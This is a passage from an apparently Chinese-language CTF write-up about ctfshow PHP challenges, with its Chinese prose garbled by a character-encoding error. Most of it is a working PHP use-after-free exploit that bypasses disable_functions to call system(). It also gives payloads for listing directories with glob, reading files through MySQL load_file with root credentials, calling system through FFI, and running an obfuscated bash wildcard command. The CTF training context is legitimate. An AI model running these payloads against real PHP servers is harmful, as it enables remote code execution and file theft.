çš„å€¼</p></blockquote><p>â…¢</p><blockquote><p>?c=print_r(get_defined_vars());//è·å¾—å¹¶æ‰“å°æ‰€æœ‰å˜é‡</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210803142137477.png"></p><p>æœ‰ post å˜é‡ ä¼ å€¼è¿›å»</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210803142221361.png"></p><p>post å˜é‡å¯æ§ æˆ‘ä»¬å…ˆå°è¯•å®šä½åˆ°è¯¥ post å˜é‡</p><p>æ•°ç»„æ“ä½œï¼š</p><p>post å˜é‡ä½äºç¬¬äºŒ</p><blockquote><p>?c=print(next(get_defined_vars()))</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210803142546722.png"></p><p>å–å‡ºäº†è¯¥æ•°ç»„çš„é”®å€¼å¯¹</p><p>å–å‡ºå€¼</p><blockquote><p>?c=print(array_pop(next(get_defined_vars())))</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210803142926765.png"></p><p>æ¥ç€æ‰§è¡Œ RCE å³å¯</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210803143029652.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210803143059815.png"></p><ul><li>ç¼“å†²åŒºæ¸…é™¤</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = ob_get_contents();<br>        ob_end_clean();<br>        <span class="hljs-keyword">echo</span> preg_replace(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è·å–ç¼“å†²åŒºå†…å®¹å¹¶ä¸”æ¸…é™¤ï¼Œç„¶åæŠŠå†…å®¹æ›¿æ¢æˆ<code>?</code></p><blockquote><p>?c=$it = new DirectoryIterator(â€œglob:///*â€);foreach($it as $f) {echo$f-&gt;getFilename().â€\nâ€;}die();</p></blockquote><p>UAFï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>pwn(<span class="hljs-string">&quot;cat /flag0.txt&quot;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ctfshow</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$backtrace</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>;<br>            <span class="hljs-keyword">unset</span>(<span class="hljs-keyword">$this</span>-&gt;a);<br>            <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;getTrace();<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123;<br>                <span class="hljs-variable">$backtrace</span> = debug_backtrace();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= ord(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= sprintf(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = sprintf(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = strlen(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = leak(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = leak(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = leak(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = leak(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = leak(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = leak(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = leak(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = leak(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123;<br><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123;<br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = leak(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = leak(<span class="hljs-variable">$leak</span>);<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = leak(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = leak(<span class="hljs-variable">$leak</span>);<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = leak(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = leak(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = leak(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123;<br>                <span class="hljs-keyword">return</span> leak(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>&#123;<br><br>        <span class="hljs-variable">$arg</span> = str_shuffle(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br>        <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> Vuln();<br>        <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(stristr(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>;<br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = str_shuffle(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br><br>    trigger_uaf(<span class="hljs-string">&#x27;x&#x27;</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];<br><br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> Helper;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br><br>    <span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || strlen(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$closure_handlers</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br><br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br><br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br><br>    <span class="hljs-variable">$closure_obj</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-variable">$binary_leak</span> = leak(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = get_binary_base(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = parse_elf(<span class="hljs-variable">$base</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = get_basic_funcs(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = get_system(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>        write(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, leak(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br><br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>);<br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>);<br><br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br>ctfshow(<span class="hljs-string">&quot;cat /flag0.txt&quot;</span>);ob_end_flush();<br><span class="hljs-comment">#éœ€è¦é€šè¿‡urlç¼–ç </span><br></code></pre></td></tr></table></figure><p>æ•°æ®åº“ load_file è¯»å–ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-keyword">try</span> &#123;<span class="hljs-variable">$dbh</span> = <span class="hljs-keyword">new</span> PDO(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dbh</span>-&gt;query(<span class="hljs-string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]).<span class="hljs-string">&quot;|&quot;</span>; &#125;<span class="hljs-variable">$dbh</span> = <span class="hljs-literal">null</span>;&#125;<span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>-&gt;getMessage();<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);&#125;<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">#åˆ é™¤æ‰€æœ‰ç¼©è¿›</span><br></code></pre></td></tr></table></figure><p>php74 ç‰¹æ€§ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªsystemå¯¹è±¡</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="hljs-comment">//æ²¡æœ‰å›æ˜¾çš„</span><br><span class="hljs-variable">$ffi</span>-&gt;system(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//é€šè¿‡$ffiå»è°ƒç”¨systemå‡½æ•°</span><br></code></pre></td></tr></table></figure><blockquote><p>${PATH:~A}${PWD:~A}${IFS}????.???</p></blockquote><h2 id="include-c"><a href="#include-c" class="headerlink" 